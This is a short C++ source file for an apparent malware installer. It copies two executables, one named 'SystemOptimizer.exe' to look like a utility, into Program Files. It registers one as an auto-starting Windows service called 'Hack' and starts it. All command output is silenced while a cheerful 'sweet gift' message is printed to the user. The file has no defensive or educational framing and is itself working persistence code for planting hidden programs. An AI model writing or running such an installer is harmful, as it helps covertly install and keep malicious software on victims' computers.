/*
	The installer application that sets the service application and launches the service for the first time.
	Copies the Hack executables to an anonymous location in the system for backup.
*/
#include<iostream>
#include<windows.h>
#include<unistd.h>
#include<cstring>

int main()
{
	std::string copy_cmd1="copy /Y \"SystemOptimizer.exe\" \"C:\\Program Files\\SystemOptimizer.exe\"",copy_cmd2="copy /Y \"authorise.exe\" \"C:\\Program Files\\authorise.exe\"",service_create_cmd="sc.exe create Hack binPath=\"C:\\Program Files\\authorise.exe -k runservice\" DisplayName=\"Hack\" start=auto",execution_cmd="sc.exe start Hack";
	std::cout<<"Your sweet gift from Prabin Rath.... :) :) :)";
	copy_cmd1+=" > nul";copy_cmd2+=" > nul";service_create_cmd+=" > nul";execution_cmd+=" > nul";
	system(copy_cmd1.c_str());system(copy_cmd2.c_str());
	system(service_create_cmd.c_str());
	std::cout<<"\nWith Love From Prabin Kumar Rath";
	system(execution_cmd.c_str());
	sleep(5);
	return 0;
}
